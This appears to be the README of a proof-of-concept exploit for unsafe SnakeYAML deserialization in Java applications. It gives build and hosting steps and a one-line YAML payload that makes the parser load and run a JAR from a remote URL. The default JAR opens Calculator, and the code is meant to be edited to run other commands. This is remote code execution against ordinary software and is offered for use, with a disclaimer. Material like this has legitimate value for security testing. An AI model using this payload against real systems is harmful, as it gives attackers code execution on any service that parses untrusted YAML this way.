# PoC SnakeYAML

## Usage

* Update the code in `src/pocsnakeyaml/PocScriptEngineFactory.java`, by default it will open the Calculator application on OS X
* Run `./build.sh` to compile the Java class and pack the JAR file
* Host the `poc.jar` file on your webserver or use a local webserver, for example `python3 -m http.server`

Use the following payload in the YAML file:

```yaml
some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8000/poc.jar"]]]]
```

_I set the JAVA_PATH variable in `build.sh` to a custom Java home path, you might want to change this._

## Disclaimer

This code is meant as proof-of-concept for vulnerabilities in projects using SnakeYAML on an unsafe way. I'm not related to SnakeYAML in any way and I'm not responsible for any activities of others using this PoC.
